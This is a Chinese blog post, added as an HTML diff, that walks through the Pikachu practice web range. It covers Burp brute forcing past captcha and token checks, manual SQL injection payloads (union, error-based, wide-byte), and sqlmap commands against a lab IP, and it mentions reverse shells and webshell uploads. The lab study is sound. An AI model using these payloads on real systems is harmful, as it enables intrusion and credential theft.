@@ -1,0 +1,239 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>pikachu靶场 | myBlog</title><meta name="author" content="Q"><meta name="copyright" content="Q"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="暴力破解原理：暴力破解（是一种计算机安全攻击方法，其原理是通过尝试所有可能的密码组合，直到找到正确的密码为止。 1.基于表单的暴力破解 看到这个，再看到题目名字，直接使用burp中的爆破功能，我们抓取他登陆的包 然后导入我们的字典，开始爆破，成功得出账号密码分别是admin和123456  2.验证码绕过(on server)1.保持bp的抓包状态，随便输入账号和密码，先不输入验证码。 2.打开b">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pikachu靶场">
+<meta property="og:url" content="http://example.com/2023/12/27/pikachu%E9%9D%B6%E5%9C%BA/index.html">
+<meta property="og:site_name" content="myBlog">
+<meta property="og:description" content="暴力破解原理：暴力破解（是一种计算机安全攻击方法，其原理是通过尝试所有可能的密码组合，直到找到正确的密码为止。 1.基于表单的暴力破解 看到这个，再看到题目名字，直接使用burp中的爆破功能，我们抓取他登陆的包 然后导入我们的字典，开始爆破，成功得出账号密码分别是admin和123456  2.验证码绕过(on server)1.保持bp的抓包状态，随便输入账号和密码，先不输入验证码。 2.打开b">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/avatar.png">
+<meta property="article:published_time" content="2023-12-27T13:19:27.780Z">
+<meta property="article:modified_time" content="2023-12-27T13:45:01.891Z">
+<meta property="article:author" content="Q">
+<meta property="article:tag" content="实验">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/12/27/pikachu%E9%9D%B6%E5%9C%BA/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":-1,"unescape":true,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'pikachu靶场',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-12-27 21:45:01'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/background.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="myBlog"><span class="site-name">myBlog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">pikachu靶场</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-27T13:19:27.780Z" title="发表于 2023-12-27 21:19:27">2023-12-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-12-27T13:45:01.891Z" title="更新于 2023-12-27 21:45:01">2023-12-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8/">安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">网络渗透测试</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%B6%E5%9C%BA/">靶场</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>5分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="pikachu靶场"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>原理：暴力破解（是一种计算机安全攻击方法，其原理是通过尝试所有可能的密码组合，直到找到正确的密码为止。</p>
+<h3 id="1-基于表单的暴力破解"><a href="#1-基于表单的暴力破解" class="headerlink" title="1.基于表单的暴力破解"></a>1.基于表单的暴力破解</h3><p><img src="/../images/pikachu.assets/1.png"></p>
+<p>看到这个，再看到题目名字，直接使用burp中的爆破功能，我们抓取他登陆的包</p>
+<p>然后导入我们的字典，开始爆破，成功得出账号密码分别是admin和123456</p>
+<p><img src="/../images/pikachu.assets/2.png"></p>
+<h3 id="2-验证码绕过-on-server"><a href="#2-验证码绕过-on-server" class="headerlink" title="2.验证码绕过(on server)"></a>2.验证码绕过(on server)</h3><p>1.保持bp的抓包状态，随便输入账号和密码，先不输入验证码。</p>
+<p>2.打开bp，右击选择send to repeater，把请求发送到 repeater</p>
+<p>3.打开Repeater，点击GO,观察状态。</p>
+<p>4.这时，右侧会显示验证码不能为空，因为此前没有输入验证码</p>
+<p>5.如果随便输入一个验证码，此时显示验证码错误！</p>
+<p>6.然后把pikachu平台中的正确的验证码输入进去，则显示账号或密码错误！说明了后台会把提交的验证码进行验证，看是否正确，接下来进行暴力破解！</p>
+<p>7.然后把pikachu平台中的正确的验证码输入进去，则显示账号或密码错误！说明了后台会把提交的验证码进行验证，看是否正确，接下来进行暴力破解！步骤和基于表单的暴力破解是一样。将Proxy中抓到的，右击发送到Intruder，然后添加账户和密码变量，放入字典。</p>
+<p>（第一题知道了他账号密码，所以就直接不上字典了）</p>
+<p><img src="/../images/pikachu.assets/3.png"></p>
+<h3 id="3-验证码绕过-on-click"><a href="#3-验证码绕过-on-click" class="headerlink" title="3.验证码绕过(on click)"></a>3.验证码绕过(on click)</h3><p>验证码输入正确、为空、输入错误分别提示login success，请输入验证码，验证码输入错误。</p>
+<p>什么都不输入或只输入用户名和密码点击登录，页面弹出“请输入验证码！”的提示框，而不是用户名和密码不存在</p>
+<p>我们查看源码，输入的验证码在本地验证，我们可以在burp suite不输入验证码或者输入错的验证码完成爆破</p>
+<p>burp suite抓包，删除验证码，发送到intruder模块</p>
+<p><img src="/../images/pikachu.assets/4.png"></p>
+<h3 id="4-token防爆破？"><a href="#4-token防爆破？" class="headerlink" title="4.token防爆破？"></a>4.token防爆破？</h3><p>这一关增加的Token值，用来防止爆破，不过在多次抓包在之后，发现每次返回的数据中含有下一次的Token值</p>
+<p><img src="/../images/pikachu.assets/5.png"></p>
+<p>满足以上条件我们就可以使用burp的音叉攻击进行爆破，线程必须为1，参数为password和token</p>
+<p><img src="/../images/pikachu.assets/6.png"></p>
+<p>password载荷设置：</p>
+<p><img src="/../images/pikachu.assets/7.png"></p>
+<p>上图中，第五步复制的value值放入下图中：</p>
+<p><img src="/../images/pikachu.assets/8.png"></p>
+<p>开始攻击</p>
+<p><img src="/../images/pikachu.assets/9.png"></p>
+<h2 id="SQL-Inject"><a href="#SQL-Inject" class="headerlink" title="SQL-Inject"></a>SQL-Inject</h2><h3 id="1-数字型注入"><a href="#1-数字型注入" class="headerlink" title="1. 数字型注入"></a>1. 数字型注入</h3><p>提示提交方式为post，使用手注</p>
+<p>使用bp抓包并发送到Repeater</p>
+<p><img src="/../images/pikachu.assets/10.png"></p>
+<p>判断列数为2</p>
+<p><img src="/../images/pikachu.assets/11.png"></p>
+<p><img src="/../images/pikachu.assets/12.png"></p>
+<p>查库</p>
+<p><img src="/../images/pikachu.assets/13.png"></p>
+<p>查表</p>
+<p><img src="/../images/pikachu.assets/14.png"></p>
+<p>查列</p>
+<p><img src="/../images/pikachu.assets/15.png"></p>
+<p>查数据</p>
+<p><img src="/../images/pikachu.assets/16.png"></p>
+<p>可知密码通过md5加密，使用账号&#x2F;密码为admin&#x2F;123456</p>
+<p><img src="/../images/pikachu.assets/17.png"></p>
+<h3 id="2-字符型注入"><a href="#2-字符型注入" class="headerlink" title="2.字符型注入"></a>2.字符型注入</h3><p>提示为字符型，且提交方式为get，使用sqlmap</p>
+<p><img src="/../images/pikachu.assets/18.png"></p>
+<p>查询数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://47.97.37.19:8000/vul/sqli/sqli_str.php?name=valen&amp;submit=%E6%9F%A5%E8%AF%A2&#x27; --dbs</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/pikachu.assets/19.png"></p>
+<p>查询数据表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://47.97.37.19:8000/vul/sqli/sqli_str.php?name=valen&amp;submit=%E6%9F%A5%E8%AF%A2&#x27; -D pikachu --tables</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/pikachu.assets/20.png"></p>
+<p>查询数据表中的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://47.97.37.19:8000/vul/sqli/sqli_str.php?name=valen&amp;submit=%E6%9F%A5%E8%AF%A2&#x27; -D pikachu -T users --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/pikachu.assets/21.png"></p>
+<h3 id="3-搜索型注入"><a href="#3-搜索型注入" class="headerlink" title="3.搜索型注入"></a>3.搜索型注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//手注Payload:</span><br><span class="line">&#x27; order by 3  # //爆回显位</span><br><span class="line">&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #  //爆数据表名</span><br><span class="line">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=users #  //爆字段名</span><br><span class="line">&#x27; union select 1,username,password from users #  //爆字段值</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-insert-update注入"><a href="#4-insert-update注入" class="headerlink" title="4.insert&#x2F;update注入"></a>4.insert&#x2F;update注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//sqlmapPayload:</span><br><span class="line">sqlmap -u &quot;http://47.97.37.19:8000/vul/sqli/sqli_iu/sqli_reg.php&quot;  --data=&quot;username=1111&amp;password=1&amp;sex=1&amp;phonenum=1&amp;email=1&amp;add=1&amp;submit=submit&quot;  --dbs</span><br><span class="line">余下步骤与第二题一样</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-delete注入"><a href="#5-delete注入" class="headerlink" title="5.delete注入"></a>5.delete注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//在bp中手注（报错注入）</span><br><span class="line">//手注Payload:</span><br><span class="line">and updatexml(1,concat(0x7e,(select database()),0x7e),1) //查询库</span><br><span class="line">//余下步骤与第七题一样</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="7-http头注入"><a href="#7-http头注入" class="headerlink" title="7.http头注入"></a>7.http头注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//在bp中手注（报错注入）</span><br><span class="line">//手注Payload:</span><br><span class="line">1&#x27; update(0,concat(0x7b,database()),1) or &#x27; //查库</span><br><span class="line">&#x27; or updatexml(0,concat(0x7b,substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;pikachu&#x27;),1,31)),1) or &#x27; //查表</span><br><span class="line">&#x27; or updatexml(0,concat(0x7b,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),1,31)),1) or &#x27; //查字段名</span><br><span class="line">&#x27; or updatexml(0,concat(0x7b,substr((select group_concat(username,&#x27;:&#x27;,password) from users),1,31)),1) or &#x27; //查字段值</span><br><span class="line">//报错误注入会限制整数，可修改查询语句来查询未查询信息</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="8-基于boolian的盲注"><a href="#8-基于boolian的盲注" class="headerlink" title="8.基于boolian的盲注"></a>8.基于boolian的盲注</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//（布尔盲注通过页面返回的True或False来判断）</span><br><span class="line">//sqlmapPayload:</span><br><span class="line">sqlmap -u &quot;http://47.97.37.19:8000/vul/sqli/sqli_blind_b.php?name=ad&amp;submit=%E6%9F%A5%E8%AF%A2&quot; –dbs</span><br><span class="line">//余下步骤与第二题一样</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="9-基于时间的盲注"><a href="#9-基于时间的盲注" class="headerlink" title="9.基于时间的盲注"></a>9.基于时间的盲注</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//(时间盲注通过页面回应时间来判断)</span><br><span class="line">//sqlmapPayload:</span><br><span class="line">sqlmap -u &quot;http://47.97.37.19:8000/vul/sqli/sqli_blind_t.php?name=ad&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --dbs  </span><br><span class="line">//余下步骤与第二题一样</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="10-wide-byte注入"><a href="#10-wide-byte注入" class="headerlink" title="10.wide byte注入"></a>10.wide byte注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//在bp中手注</span><br><span class="line">///Payload: </span><br><span class="line">name=kobe%df’ union select 1,database() # //查库</span><br><span class="line">name=1%df’ union select (select group_concat(table_name) from information_schema.tables where table_schema=database()),2# //查表</span><br><span class="line">name=1%df’ union select (select group_concat(column_name) from information_schema.columns where table_schema=(select database()) and table_name=(select table_name from information_schema.tables where table_schema=(select database())limit 3,1)),2# //查字段名</span><br><span class="line">name=1%df’ union select (select group_concat(username,0x3b,password) from test.users),2#//查字段内容</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="1-exec-“ping”"><a href="#1-exec-“ping”" class="headerlink" title="1. exec “ping”"></a><strong>1. exec “ping”</strong></h3><p>输入框相当与linux终端</p>
+<p>可以利用反shell控制（需要内网穿透）、上传木马</p>
+<p><img src="/../images/pikachu.assets/22.png"></p>
+<p><img src="/../images/pikachu.assets/23.png"></p>
+<h3 id="2-exec-“eval”"><a href="#2-exec-“eval”" class="headerlink" title="2.exec “eval”"></a><strong>2.exec “eval”</strong></h3><p>输入框将用户输入的字符串当做php脚本了解析执行</p>
+<p>可以利用system()函数反shell连接（需要内网穿透）或者上传木马通过中国蚁剑连接</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Q</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/12/27/pikachu%E9%9D%B6%E5%9C%BA/">http://example.com/2023/12/27/pikachu靶场/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">myBlog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AE%9E%E9%AA%8C/">实验</a></div><div class="post_share"><div class="social-share" data-image="/img/avatar.png" data-sites="wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/12/27/%E5%8F%8D%E5%BC%B9shell/" title="反弹shell"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">反弹shell</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/12/10/%E5%AE%9E%E9%AA%8C%E4%B8%80%20%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/" title="实验一 网络扫描与网络侦察"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-10</div><div class="title">实验一 网络扫描与网络侦察</div></div></a></div><div><a href="/2023/12/24/%E5%AE%9E%E9%AA%8C%E4%B8%89XSS%E5%92%8CSQL%E6%B3%A8%E5%85%A5/" title="实验三 XSS和SQL注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-24</div><div class="title">实验三 XSS和SQL注入</div></div></a></div><div><a href="/2023/12/20/%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81/" title="实验二 网络嗅探与身份认证"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-20</div><div class="title">实验二 网络嗅探与身份认证</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Q</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">welcome to my blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-text">暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-text">1.基于表单的暴力破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-server"><span class="toc-text">2.验证码绕过(on server)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-click"><span class="toc-text">3.验证码绕过(on click)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-token%E9%98%B2%E7%88%86%E7%A0%B4%EF%BC%9F"><span class="toc-text">4.token防爆破？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Inject"><span class="toc-text">SQL-Inject</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">1. 数字型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">2.字符型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">3.搜索型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-insert-update%E6%B3%A8%E5%85%A5"><span class="toc-text">4.insert&#x2F;update注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-delete%E6%B3%A8%E5%85%A5"><span class="toc-text">5.delete注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-http%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-text">7.http头注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E5%9F%BA%E4%BA%8Eboolian%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-text">8.基于boolian的盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-text">9.基于时间的盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-wide-byte%E6%B3%A8%E5%85%A5"><span class="toc-text">10.wide byte注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-exec-%E2%80%9Cping%E2%80%9D"><span class="toc-text">1. exec “ping”</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-exec-%E2%80%9Ceval%E2%80%9D"><span class="toc-text">2.exec “eval”</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/12/27/pikachu%E9%9D%B6%E5%9C%BA/" title="pikachu靶场">pikachu靶场</a><time datetime="2023-12-27T13:19:27.780Z" title="发表于 2023-12-27 21:19:27">2023-12-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/12/27/%E5%8F%8D%E5%BC%B9shell/" title="反弹shell">反弹shell</a><time datetime="2023-12-27T12:44:27.860Z" title="发表于 2023-12-27 20:44:27">2023-12-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/12/26/%E6%AD%A3%E5%88%99/" title="正则">正则</a><time datetime="2023-12-26T04:51:20.920Z" title="发表于 2023-12-26 12:51:20">2023-12-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/12/26/BS4%E7%AC%94%E8%AE%B0/" title="BS4">BS4</a><time datetime="2023-12-26T04:51:20.918Z" title="发表于 2023-12-26 12:51:20">2023-12-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" 